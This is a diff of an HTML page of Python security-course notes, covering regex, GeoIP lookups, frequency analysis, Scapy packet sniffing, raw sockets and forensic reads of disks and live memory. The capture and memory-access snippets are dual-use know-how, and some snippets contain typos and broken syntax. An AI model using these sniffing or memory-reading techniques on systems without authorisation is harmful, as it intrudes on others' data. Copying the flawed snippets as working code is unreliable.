-&gt;&gt;&gt; re.findall(r&quot;\w\w\w\w\w\w\w\w&quot;,&quot;(*&amp;$H@$password(*$@BK#@TF&quot;)
+&gt;&gt;&gt; re.findall(r"\w\w\w\w\w\w\w\w","(*&amp;$H@$password(*$@BK#@TF")
 ['password']
 # \w -&gt; any text char (azAZ09 and _)
-&gt;&gt;&gt; re.findall(r&quot;\w\W&quot;, &quot;Get the last letters.&quot;)
+&gt;&gt;&gt; re.findall(r"\w\W", "Get the last letters.")
 ['t ', 'e ', 't ', 's.']
 # \W -&gt; opposite of \w
-&gt;&gt;&gt; re.findall(r&quot;.\W&quot;, &quot;Moves! left$ to{ right.&quot;)
+&gt;&gt;&gt; re.findall(r".\W", "Moves! left$ to{ right.")
 ['s!', 't$', 'o{', 't.']
-&gt;&gt;&gt; re.findall(r&quot;.\W&quot;, &quot;! left$ to{ right.&quot;)
+&gt;&gt;&gt; re.findall(r".\W", "! left$ to{ right.")
 ['! ', 't$', 'o{', 't.']
 </code></pre>
 <h4 id="regex-rules-2"><a class="header" href="#regex-rules-2">RegEx Rules 2</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;\(\d\d\d\)\d\d\d-\d\d\d\d&quot;, &quot;Jenny Tutone (800)867-5309&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"\(\d\d\d\)\d\d\d-\d\d\d\d", "Jenny Tutone (800)867-5309")
 ['(800)867-5309']
-&gt;&gt;&gt; re.findall(r&quot;\S\S\s&quot;, &quot;Find Two ANYTHING )( 09 and space. &quot;)
+&gt;&gt;&gt; re.findall(r"\S\S\s", "Find Two ANYTHING )( 09 and space. ")
 ['nd ', 'wo ', 'NG ', ')( ', '09 ', 'nd ', 'e. ']
 # \d matches digits
 # \D opposite of \d
@@ -983,10 +1222,10 @@ AttributeError: 'NoneType' object has no attribute 'group'
 # \ escapes special chars
 </code></pre>
 <h4 id="custom-sets"><a class="header" href="#custom-sets">Custom Sets</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;\d\d/\d\d/\d\d&quot;, &quot;12/25/00 99/99/99&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"\d\d/\d\d/\d\d", "12/25/00 99/99/99")
 ['12/25/00', '99/99/99']
 # 99/99/99 is not a valid date
-&gt;&gt;&gt; re.findall(r&quot;[01]\d/[0-3]\d/\d\d&quot;, &quot;12/25/00 99/99/99&quot;)
+&gt;&gt;&gt; re.findall(r"[01]\d/[0-3]\d/\d\d", "12/25/00 99/99/99")
 ['12/25/00']
 # [A-Z] for uppercase letters
 # [a-z] for lowercase letters
@@ -996,18 +1235,18 @@ AttributeError: 'NoneType' object has no attribute 'group'
 # [\w] for any text char
 </code></pre>
 <h4 id="logical-or-statement"><a class="header" href="#logical-or-statement">Logical OR Statement</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;(0[1-9]|1[0-2])&quot;, &quot;12/25/00 13/09/99&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"(0[1-9]|1[0-2])", "12/25/00 13/09/99")
 ['12', '09']
-&gt;&gt;&gt; re.findall(r&quot;(0[1-9]|[1-2][0-9]|3[0-1])&quot;, &quot;13/32/31 01/19/00&quot;)
+&gt;&gt;&gt; re.findall(r"(0[1-9]|[1-2][0-9]|3[0-1])", "13/32/31 01/19/00")
 ['13', '31', '01', '19']
-&gt;&gt;&gt; re.findall(r&quot;(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3]0-1])/\d\d&quot;, &quot;13/31/99 12/32/50 01/19/00&quot;)
+&gt;&gt;&gt; re.findall(r"(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3]0-1])/\d\d", "13/31/99 12/32/50 01/19/00")
 ['01/19/00']
 # (?:regex1|regex2|regex3) match regex1 or regex2 or regex3
 </code></pre>
 <h4 id="repeating-chars"><a class="header" href="#repeating-chars">Repeating Chars</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;http://[\w.\\/]+&quot;, &quot;&lt;img src=http://url.com/image.jpg&gt;&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"http://[\w.\\/]+", "&lt;img src=http://url.com/image.jpg&gt;")
 ['http://url.com/image.jpg']
-&gt;&gt;&gt; re.findall(r&quot;\d{1,3}\.\d{1,3}\.\d{1,3}&quot;, &quot;http://127.23.9.120:80/&quot;)
+&gt;&gt;&gt; re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}", "http://127.23.9.120:80/")
 ['127.23.9']
 # {x} -&gt; match exactly x copies of the previous character characters
 # {x,[y]} -&gt; match between x and y of the previous character, if y is omitted, it finds x or more matches
@@ -1016,59 +1255,59 @@ AttributeError: 'NoneType' object has no attribute 'group'
 # ? -&gt; the previous character is optional (\d{0,1})
 </code></pre>
 <h4 id="regex-flags-and-modifiers"><a class="header" href="#regex-flags-and-modifiers">RegEx Flags and Modifiers</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;sec573&quot;, &quot;sec573,SEC573,Sec573&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"sec573", "sec573,SEC573,Sec573")
 ['sec573']
-&gt;&gt;&gt; re.findall(r&quot;(?i)sec573&quot;, &quot;sec573,SEC573,Sec573&quot;)
+&gt;&gt;&gt; re.findall(r"(?i)sec573", "sec573,SEC573,Sec573")
 ['sec573', 'SEC573', 'Sec573']
-&gt;&gt;&gt; re.findall(r&quot;sec573&quot;, &quot;sec573,SEC573,Sec573&quot;, re.IGNORECASE)
+&gt;&gt;&gt; re.findall(r"sec573", "sec573,SEC573,Sec573", re.IGNORECASE)
 ['sec573', 'SEC573', 'Sec573']
 # re.IGNORECASE or(?i) will ignore the case and make the search case insensitive
-&gt;&gt;&gt; re.findall(r&quot;^sec573&quot;, &quot;\nsec573\nsec573 is excellent!&quot;)
+&gt;&gt;&gt; re.findall(r"^sec573", "\nsec573\nsec573 is excellent!")
 []
-&gt;&gt;&gt; re.findall(r&quot;(?m)^sec573&quot;, &quot;\nsec573\nsec573 is excellent!&quot;)
+&gt;&gt;&gt; re.findall(r"(?m)^sec573", "\nsec573\nsec573 is excellent!")
 ['sec573', 'sec573']
-&gt;&gt;&gt; re.findall(r&quot;^sec573&quot;, &quot;\nsec573\nsec573 is excellent!&quot;, re.MULTILINE)
+&gt;&gt;&gt; re.findall(r"^sec573", "\nsec573\nsec573 is excellent!", re.MULTILINE)
 ['sec573', 'sec573']
 # re.MULTILINE or (?m) will turn on multiline matching
 </code></pre>
 <h4 id="greedy-matching"><a class="header" href="#greedy-matching">Greedy Matching</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;[A-Z].+\.&quot;, &quot;Hello. Hi. Python rocks. I know.&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"[A-Z].+\.", "Hello. Hi. Python rocks. I know.")
 ['Hello. Hi. Python rocks. I know.']
 # * and + are greedy, they match as much as they can
-&gt;&gt;&gt; re.findall(r&quot;[A-Z].+?\.&quot;, &quot;Hello. Hi. Python rocks. I know.&quot;)
+&gt;&gt;&gt; re.findall(r"[A-Z].+?\.", "Hello. Hi. Python rocks. I know.")
 ['Hello.', 'Hi.', 'Python rocks.', 'I know.']
 # *? and +? turns off greedy matching
 </code></pre>
 <h4 id="not-custom-set"><a class="header" href="#not-custom-set">NOT Custom Set</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;[A-Z][^A-Z]&quot;, &quot;Things That start with Caps&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"[A-Z][^A-Z]", "Things That start with Caps")
 ['Th', 'Th', 'Ca']
-&gt;&gt;&gt; re.findall(r&quot;[A-Z][^?.!]+&quot;, &quot;Find. The sentences? Yes!&quot;)
+&gt;&gt;&gt; re.findall(r"[A-Z][^?.!]+", "Find. The sentences? Yes!")
 ['Find', 'The sentences', 'Yes']
-# [^&quot;] in first position negates the set
+# [^"] in first position negates the set
 </code></pre>
 <h3 id="regex-groups"><a class="header" href="#regex-groups">RegEx Groups</a></h3>
 <h4 id="why-use-capture-groups"><a class="header" href="#why-use-capture-groups">Why Use Capture Groups</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; data = open(&quot;data&quot;, &quot;r&quot;).read()
+<pre><code class="language-python">&gt;&gt;&gt; data = open("data", "r").read()
 &gt;&gt;&gt; data
 'client 103.4.22.120#121212\nclient 103.1.22.120#121212\nclient 103.2.22.120#121212\nclient 103.3.22.120#121212\nclient 103.4.22.120#121212\n'
-&gt;&gt;&gt; re.findall(&quot;client .*?#&quot;, data)
+&gt;&gt;&gt; re.findall("client .*?#", data)
 ['client 103.4.22.120#', 'client 103.1.22.120#', 'client 103.2.22.120#', 'client 103.3.22.120#', 'client 103.4.22.120#']
 # included things you don't want
-&gt;&gt;&gt; re.findall(&quot;client (.*?)#&quot;, data)
+&gt;&gt;&gt; re.findall("client (.*?)#", data)
 ['103.4.22.120', '103.1.22.120', '103.2.22.120', '103.3.22.120', '103.4.22.120']
 # () generates a capture group
 </code></pre>
 <h4 id="capture-groups-vs-non-capture-groups"><a class="header" href="#capture-groups-vs-non-capture-groups">Capture Groups vs. Non Capture Groups</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(r&quot;(0[1-9]|1[0-2])/(0[1-9]|[1-2][0-9]|3[01])/\d\d&quot;, &quot;13/31/99 12/32/50 01/19/00&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall(r"(0[1-9]|1[0-2])/(0[1-9]|[1-2][0-9]|3[01])/\d\d", "13/31/99 12/32/50 01/19/00")
 [('01', '19')]
 # as soon as parantheses are added, you only get back what's inside the parantheses
-&gt;&gt;&gt; re.findall(r&quot;(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3[01])/\d\d&quot;, &quot;13/31/99 12/32/50 01/19/00&quot;)
+&gt;&gt;&gt; re.findall(r"(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3[01])/\d\d", "13/31/99 12/32/50 01/19/00")
 ['01/19/00']
 # non capture groups group together parts of the regex without capturing
 </code></pre>
 <h4 id="search-and-match-groups"><a class="header" href="#search-and-match-groups">search() and match() Groups</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; srchstr = r&quot;192.168.100.100-123.123.123.123-234.131.234.123&quot;
-&gt;&gt;&gt; result = re.search(r&quot;(\d\d\d)\.(\d\d\d)\.(\d\d\d)\.(\d\d\d)&quot;, srchstr)
+<pre><code class="language-python">&gt;&gt;&gt; srchstr = r"192.168.100.100-123.123.123.123-234.131.234.123"
+&gt;&gt;&gt; result = re.search(r"(\d\d\d)\.(\d\d\d)\.(\d\d\d)\.(\d\d\d)", srchstr)
 &gt;&gt;&gt; result.group()
 '192.168.100.100'
 &gt;&gt;&gt; result.group(2)
@@ -1079,27 +1318,27 @@ AttributeError: 'NoneType' object has no attribute 'group'
 # RegEx group numbers begin counting at 1
 </code></pre>
 <h4 id="python-capturing-named-groups"><a class="header" href="#python-capturing-named-groups">Python Capturing Named Groups</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; a = re.search(r&quot;(?P&lt;areacode&gt;\d\d\d)-\d\d\d-\d\d\d\d&quot;, &quot;814-422-5632&quot;)
-&gt;&gt;&gt; a.group(&quot;areacode&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; a = re.search(r"(?P&lt;areacode&gt;\d\d\d)-\d\d\d-\d\d\d\d", "814-422-5632")
+&gt;&gt;&gt; a.group("areacode")
 '814'
 &gt;&gt;&gt; a.group()
 '814-422-5632'
-# create a named group (?P&lt;groupname&gt;['\&quot;])
-# use search or match.group(&quot;&lt;groupname&gt;&quot;) to retrieve the data
+# create a named group (?P&lt;groupname&gt;['\"])
+# use search or match.group("&lt;groupname&gt;") to retrieve the data
 </code></pre>
 <h3 id="regex-back-references"><a class="header" href="#regex-back-references">RegEx Back References</a></h3>
-<pre><code class="language-python">&gt;&gt;&gt; data = r&quot;&lt;tag1&gt;data1&lt;/tag1&gt;&lt;tag8&gt;data2&lt;/tag8&gt;&quot;
-&gt;&gt;&gt; re.findall(r&quot;&lt;\w+&gt;(.*?)&lt;/\w+&gt;&quot;, data)
+<pre><code class="language-python">&gt;&gt;&gt; data = r"&lt;tag1&gt;data1&lt;/tag1&gt;&lt;tag8&gt;data2&lt;/tag8&gt;"
+&gt;&gt;&gt; re.findall(r"&lt;\w+&gt;(.*?)&lt;/\w+&gt;", data)
 ['data1', 'data2']
-&gt;&gt;&gt; data = r&quot;&lt;tag1&gt;&lt;tag8&gt;data1&lt;/tag8&gt;&lt;/tag1&gt;&lt;tag2&gt;data2&lt;/tag2&gt;&quot;
-&gt;&gt;&gt; re.findall(r&quot;&lt;\w+&gt;(.*?)&lt;/\w+&gt;&quot;, data)
+&gt;&gt;&gt; data = r"&lt;tag1&gt;&lt;tag8&gt;data1&lt;/tag8&gt;&lt;/tag1&gt;&lt;tag2&gt;data2&lt;/tag2&gt;"
+&gt;&gt;&gt; re.findall(r"&lt;\w+&gt;(.*?)&lt;/\w+&gt;", data)
 ['&lt;tag8&gt;data1', 'data2']
 # when nested, system falls apart
-&gt;&gt;&gt; re.findall(r&quot;&lt;(\w+)&gt;(.*?)&lt;/\1&gt;&quot;, data)
+&gt;&gt;&gt; re.findall(r"&lt;(\w+)&gt;(.*?)&lt;/\1&gt;", data)
 [('tag1', '&lt;tag8&gt;data1&lt;/tag8&gt;'), ('tag2', 'data2')]
-# &quot;\1&quot; will let you refer back to the contents of capture group one
+# "\1" will let you refer back to the contents of capture group one
 # named groups can also be used
-# r&quot;&lt;(?&lt;TAG&gt;\w+)&gt;(.*?)&lt;/(?P=TAG)&gt;&quot;, data&quot;)
+# r"&lt;(?&lt;TAG&gt;\w+)&gt;(.*?)&lt;/(?P=TAG)&gt;", data")
 </code></pre>
 <h3 id="sets"><a class="header" href="#sets">Sets</a></h3>
 <h4 id="python-sets"><a class="header" href="#python-sets">Python Sets</a></h4>
@@ -1112,7 +1351,7 @@ AttributeError: 'NoneType' object has no attribute 'group'
 &gt;&gt;&gt; myset = set([1,2,3])
 &gt;&gt;&gt; myset.update([4,5,6])
 # can add everything from another list
-&gt;&gt;&gt; myset.add(&quot;A&quot;)
+&gt;&gt;&gt; myset.add("A")
 # adds one item
 &gt;&gt;&gt; myset
 {1, 2, 3, 4, 5, 6, 'A'}
@@ -1191,18 +1430,18 @@ sudo apt install libmaxminddb0 libmaxminddb0-dev mmdb-bin
 </code></pre>
 <h4 id="geoip2---retrieving-record-details-1"><a class="header" href="#geoip2---retrieving-record-details-1">geoIP2 - Retrieving Record Details 1</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import geoip2.database
-&gt;&gt;&gt; reader = geoip2.database.Reader(&quot;GeoLite2-City.mmdb&quot;)
+&gt;&gt;&gt; reader = geoip2.database.Reader("GeoLite2-City.mmdb")
 &gt;&gt;&gt; def get_geoip2_record(database, ip_address):
 ...     try:
 ...         record = database.city(ip_address)
 ...     except geoip2.errors.AddressNotFoundError:
-...         pritn(&quot;Record not found.&quot;)
+...         pritn("Record not found.")
 ...         record = None
 ...     return record
 ... 
-&gt;&gt;&gt; rec = get_geoip2_record(reader, &quot;66.35.59.202&quot;)
+&gt;&gt;&gt; rec = get_geoip2_record(reader, "66.35.59.202")
 &gt;&gt;&gt; if rec:
-...     print(&quot;The country is&quot;, rec.country.name)
+...     print("The country is", rec.country.name)
 ...     
 The country is United States
 </code></pre>
@@ -1223,42 +1462,42 @@ The country is United States
 <h4 id="detecting-randomness-by-character-frequency"><a class="header" href="#detecting-randomness-by-character-frequency">Detecting Randomness by Character Frequency</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from freq import *
 &gt;&gt;&gt; fc = FreqCounter()
-&gt;&gt;&gt; fc.load(&quot;freqtable2018.freq&quot;)
-&gt;&gt;&gt; fc.probability(&quot;normaltext&quot;)
+&gt;&gt;&gt; fc.load("freqtable2018.freq")
+&gt;&gt;&gt; fc.probability("normaltext")
 (8.0669, 5.8602)
-&gt;&gt;&gt; fc.probability(&quot;vojervonrew&quot;)
+&gt;&gt;&gt; fc.probability("vojervonrew")
 (9.1246, 7.2307)
-&gt;&gt;&gt; fc.probability(&quot;987zt2637g&quot;)
+&gt;&gt;&gt; fc.probability("987zt2637g")
 (1.6787, 0.0146)
 # .load() reads a file with character frequency data
-# .probability() measures a string based on the table and returns the &quot;average probability&quot; and the &quot;word probability&quot;
+# .probability() measures a string based on the table and returns the "average probability" and the "word probability"
 </code></pre>
 <h4 id="build-your-own-frequency-table"><a class="header" href="#build-your-own-frequency-table">Build your own Frequency Table</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from freq import *
 &gt;&gt;&gt; fc = FreqCounter()
-&gt;&gt;&gt; fc.tally_str(open(&quot;hamlet.txt&quot;, &quot;rt&quot;).read())
-&gt;&gt;&gt; fc.probability(&quot;987zt2637g&quot;)
+&gt;&gt;&gt; fc.tally_str(open("hamlet.txt", "rt").read())
+&gt;&gt;&gt; fc.probability("987zt2637g")
 (0.0, 0.0)
-&gt;&gt;&gt; fc.probability(&quot;normaltext&quot;)
+&gt;&gt;&gt; fc.probability("normaltext")
 (6.7105, 5.8932)
-&gt;&gt;&gt; fc.probability(&quot;love&quot;)
+&gt;&gt;&gt; fc.probability("love")
 (29.8657, 10.2661)
 # general rule: any value &lt; 5% is probably not worth looking at
-&gt;&gt;&gt; fc.ignorechars -= &quot;.&quot;
+&gt;&gt;&gt; fc.ignorechars -= "."
 # to ignore certain characters
 </code></pre>
 <h3 id="introduction-to-scapy"><a class="header" href="#introduction-to-scapy">Introduction to Scapy</a></h3>
 <h4 id="reading-and-writing-packetlists"><a class="header" href="#reading-and-writing-packetlists">Reading and Writing PacketLists</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from scapy.all import *
-&gt;&gt;&gt; packetlist = rdpcap(&quot;test.pcap&quot;)
+&gt;&gt;&gt; packetlist = rdpcap("test.pcap")
 # reads a file containing pcaps into a scapy.PacketList Data structure
-&gt;&gt;&gt; wrpcap(&quot;newpacketcapture.pcap&quot;, packetlist)
+&gt;&gt;&gt; wrpcap("newpacketcapture.pcap", packetlist)
 # writes a PacketList to a pcap file
-&gt;&gt;&gt; sniff(iface=&quot;eth0&quot;, store=0, lfilter=filterer, prn=analyze, stop_filter=stopper)
+&gt;&gt;&gt; sniff(iface="eth0", store=0, lfilter=filterer, prn=analyze, stop_filter=stopper)
 # to capture all packets filtered by a filterer() until some event determined by stopper(), passes them to function analyze()
-&gt;&gt;&gt; sniff(iface=&quot;eth0&quot;, lfilter=selectpackets, count=100)
+&gt;&gt;&gt; sniff(iface="eth0", lfilter=selectpackets, count=100)
 # to capture 100 packets that are selected by the selectpackets() function
-&gt;&gt;&gt; sniff(offline=&quot;test.pcap&quot;, filter=&quot;TCP PORT 80&quot;)
+&gt;&gt;&gt; sniff(offline="test.pcap", filter="TCP PORT 80")
 # to read a pcap and apply a BPF (Berkely Packet Filter)
 </code></pre>
 <h4 id="sniffs-callback-functions"><a class="header" href="#sniffs-callback-functions">sniff()'s Callback Functions</a></h4>
@@ -1271,10 +1510,10 @@ The country is United States
 ...      return packetin.haslayer(Raw)
 ...      
 &gt;&gt;&gt; def processor(packetin):
-...      print(&quot;I got a packet from&quot;, packetin[IP].src)
+...      print("I got a packet from", packetin[IP].src)
 ...      
 &gt;&gt;&gt; start_time = time.time()
-&gt;&gt;&gt; sniff(iface=&quot;lo&quot;, store=0, prn=processor, lfilter=filterer, stop_filter=stopper)
+&gt;&gt;&gt; sniff(iface="lo", store=0, prn=processor, lfilter=filterer, stop_filter=stopper)
 I got a packet from 127.0.0.1
 I got a packet from 127.0.0.1
 I got a packet from 127.0.0.1
@@ -1286,7 +1525,7 @@ I got a packet from 127.0.0.1
 <h4 id="save-memory-with-pcapreader"><a class="header" href="#save-memory-with-pcapreader">Save Memory with PcapReader</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; dir(PcapReader)
 ['PacketMetadata', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__firstlineno__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__static_attributes__', '__str__', '__subclasshook__', '__weakref__', '_read_all', '_read_packet', 'alternative', 'close', 'dispatch', 'fileno', 'nonblocking_socket', 'read_all', 'read_packet', 'recv', 'select']
-&gt;&gt;&gt; for pkt in PcapReader(&quot;test.pcap&quot;):
+&gt;&gt;&gt; for pkt in PcapReader("test.pcap"):
 ...      print(pkt.dport)
 ...      
 443
@@ -1301,7 +1540,7 @@ I got a packet from 127.0.0.1
 # can be used to step through packets with a for loop instead of loading the entire thing into memory
 </code></pre>
 <h4 id="scapyplistpacketlist"><a class="header" href="#scapyplistpacketlist">scapy.plist.PacketList</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; packetlist = rdpcap(&quot;test.pcap&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; packetlist = rdpcap("test.pcap")
 &gt;&gt;&gt; packetlist.__class__
 &lt;class 'scapy.plist.PacketList'&gt;
 &gt;&gt;&gt; dir(packetlist)
@@ -1339,7 +1578,7 @@ True
 ...      return apacket[TCP].seq
 ...
 # or sortedpackets = sorted(packets, key = lambda x:x[TCP].seq)
-&gt;&gt;&gt; packetlist = rdpcap(&quot;test.pcap&quot;)
+&gt;&gt;&gt; packetlist = rdpcap("test.pcap")
 &gt;&gt;&gt; packets = packetlist[0][TCP]
 &gt;&gt;&gt; sortedpackets = sorted(packets,key=sortorder)
 # returns a list
@@ -1352,7 +1591,7 @@ True
 <pre><code class="language-python">&gt;&gt;&gt; duplicates = [1,1,1,2,2,2,2,3,4,5,5,6,7,7,7,7,7,8,8,8,8,8,8,8,9,0]
 &gt;&gt;&gt; dict1 = {}
 &gt;&gt;&gt; for entry in duplicates:
-...      dict1[entry] = &quot;&quot;
+...      dict1[entry] = ""
 ...      
 &gt;&gt;&gt; list(dict1.keys())
 [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
@@ -1367,10 +1606,10 @@ True
 </code></pre>
 <h4 id="eliminating-bad-checksums"><a class="header" href="#eliminating-bad-checksums">Eliminating Bad Checksums</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; def verify_checksum(packet):
-...      originalChecksum = packet[&quot;TCP&quot;].chksum
-...      del packet[&quot;TCP&quot;].chksum
+...      originalChecksum = packet["TCP"].chksum
+...      del packet["TCP"].chksum
 ...      packet = IP(bytes(packet[IP]))
-...      recomputedChecksum = packet[&quot;TCP&quot;].chksum
+...      recomputedChecksum = packet["TCP"].chksum
 ...      return originalChecksum == recomputedChecksum
 # 1. Record the oiginal checksum in a variable
 # 2. Delete the existing checksum
@@ -1380,41 +1619,41 @@ True
 <h2 id="5734---automated-forensics"><a class="header" href="#5734---automated-forensics">573.4 - Automated Forensics</a></h2>
 <h3 id="the-struct-module-four-step-file-carving-process"><a class="header" href="#the-struct-module-four-step-file-carving-process">The STRUCT Module: Four-Step File-Carving Process</a></h3>
 <pre><code class="language-python"># Step 1: Get read access to the data
-# Step 2: Understand the &quot;Metadata&quot; structure that organizes/breaks up your target data and extracts your data
+# Step 2: Understand the "Metadata" structure that organizes/breaks up your target data and extracts your data
 # Step 3: Extract relevant parts with a RegEx
 # Step 4: Analyze the data
 </code></pre>
 <h4 id="step-1---live-hard-drive-carving"><a class="header" href="#step-1---live-hard-drive-carving">Step 1 - Live Hard-Drive Carving</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; fh = open(&quot;/dev/sda&quot;, &quot;rb&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; fh = open("/dev/sda", "rb")
 &gt;&gt;&gt; fh.read(80)
 # Linux
-&gt;&gt;&gt; fh = open(r&quot;\\.\PhysicalDrive0&quot;, &quot;rb&quot;)
+&gt;&gt;&gt; fh = open(r"\\.\PhysicalDrive0", "rb")
 &gt;&gt;&gt; fh.read(80)
 # Windows
 </code></pre>
 <h4 id="step-1---live-memory-carving"><a class="header" href="#step-1---live-memory-carving">Step 1 - Live Memory Carving</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import memprocfs
 &gt;&gt;&gt; vmm = memprocfs.Vmm(['-device', 'pmem://winpmem_64.sys'])
-&gt;&gt;&gt; python_process = vmm.process(&quot;python.exe&quot;)
+&gt;&gt;&gt; python_process = vmm.process("python.exe")
 &gt;&gt;&gt; python_process.memory.read(python_process.peb, 0x10)
 &gt;&gt;&gt; vmm.memory.read(process_module.base, 0x10)
 # on windows you can access live memory using the memprocfs module
-&gt;&gt;&gt; fh = open(&quot;/dev/fmem&quot;, &quot;rb&quot;)
+&gt;&gt;&gt; fh = open("/dev/fmem", "rb")
 &gt;&gt;&gt; fh.read(100)
 # for linux
 </code></pre>
 <h4 id="step-1---windows-live-network-capture"><a class="header" href="#step-1---windows-live-network-capture">Step 1 - Windows Live Network Capture</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from winpcapy import WinPcapDevices, WinPcapUtils
 &gt;&gt;&gt; print(WinPcapDevices.list_devices())
-&gt;&gt;&gt; WinPcapUtils.capture_on(&quot;*Gigabit*&quot;, lambda x:print(x[0]))
+&gt;&gt;&gt; WinPcapUtils.capture_on("*Gigabit*", lambda x:print(x[0]))
 # wincapy will allow sniffing if the NPCAP drivers are installed
 &gt;&gt;&gt; import socket
 &gt;&gt;&gt; s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
-&gt;&gt;&gt; s.bind((&quot;192.168.1.1&quot;,0))
+&gt;&gt;&gt; s.bind(("192.168.1.1",0))
 &gt;&gt;&gt; s.ioctl(socket.SIO_RCVALL,socket.RCVALL_ON)
 &gt;&gt;&gt; while True:
 ...     print(s.recv(65535([:20])
-# socket module provides &quot;raw sockets&quot; that can be used to capture live packets from the network with admin permission
+# socket module provides "raw sockets" that can be used to capture live packets from the network with admin permission
 </code></pre>
 <h4 id="step-1---linux-live-network-capture"><a class="header" href="#step-1---linux-live-network-capture">Step 1 - Linux Live Network Capture</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import socket
@@ -1427,14 +1666,14 @@ b'\xff\xff\xff\xff\xff\xff\x04\xb4\xfe\x04\x9b\x83\x88\xe1\x00\x00\xa0\x00\xb0R\
 <h4 id="step-1---analyzing-deadstatic-images"><a class="header" href="#step-1---analyzing-deadstatic-images">Step 1 - Analyzing Dead/Static Images</a></h4>
 <pre><code class="language-python"># because data comes in chunks, it could be like this:
 # FIND THE WORD WA | LDO IN THESE CHUNKS
-&gt;&gt;&gt; previous_chunk = &quot;&quot;
+&gt;&gt;&gt; previous_chunk = ""
 &gt;&gt;&gt; for each_chunk in all_chunks:
-...     if &quot;WALDO&quot; in previous_chunk + each_chunk:
-...         print(&quot;Found him!&quot;)
-...     previous_chunk = each_chunk[-len(&quot;WALDO&quot;):]
+...     if "WALDO" in previous_chunk + each_chunk:
+...         print("Found him!")
+...     previous_chunk = each_chunk[-len("WALDO"):]
 </code></pre>
 <h4 id="step-2---understanding-the-structure"><a class="header" href="#step-2---understanding-the-structure">Step 2 - Understanding the Structure</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; open(&quot;test.pcap&quot;, &quot;rb&quot;).read()[:100]
+<pre><code class="language-python">&gt;&gt;&gt; open("test.pcap", "rb").read()[:100]
 b'\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x01\x00\x00\x00\x83\xf13L7\x1f\x07\x00]\x00\x00\x00]\x00\x00\x00\x00\x1f\xf3&lt;\xe1\x13\xf8\x1e\xdf\xe5\x84:\x08\x00E\x00\x00O\xdeS@\x00@\x06G\xab\xac\x10\x0b\x0cJ}\x13\x11\xfc5\x01\xbb\xc6\xd9\x14\xd0\xc5\x1e-\xbf\x80\x18\xff\xff\xcb\x8c\x00\x00\x01\x01\x08\n\x1a}'
 # when not using scapy, you have to know where the data is in the bytes
 </code></pre>
@@ -1446,13 +1685,13 @@ b'\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x
 </code></pre>
 <h4 id="step-2---the-struct-module"><a class="header" href="#step-2---the-struct-module">Step 2 - THe STRUCT Module</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import struct
-&gt;&gt;&gt; struct.unpack(&quot;!BBBB&quot;, b&quot;\xc0\xa8\x80\xc2&quot;)
+&gt;&gt;&gt; struct.unpack("!BBBB", b"\xc0\xa8\x80\xc2")
 (192, 168, 128, 194)
-&gt;&gt;&gt; struct.unpack(&quot;!HH&quot;, b&quot;\xc0\xa8\x80\xc2&quot;)
+&gt;&gt;&gt; struct.unpack("!HH", b"\xc0\xa8\x80\xc2")
 (49320, 32962)
-&gt;&gt;&gt; struct.unpack(&quot;&lt;HH&quot;, b&quot;\xc0\xa8\x80\xc2&quot;)
+&gt;&gt;&gt; struct.unpack("&lt;HH", b"\xc0\xa8\x80\xc2")
 (43200, 49792)
-&gt;&gt;&gt; struct.unpack(&quot;!bbbb&quot;, b&quot;\xc0\xa8\x80\xc2&quot;)
+&gt;&gt;&gt; struct.unpack("!bbbb", b"\xc0\xa8\x80\xc2")
 (-64, -88, -128, -62)
 # ! or &gt; indicates to interpret data as big-endian
 # &lt; indicates to interpret data as little-endian
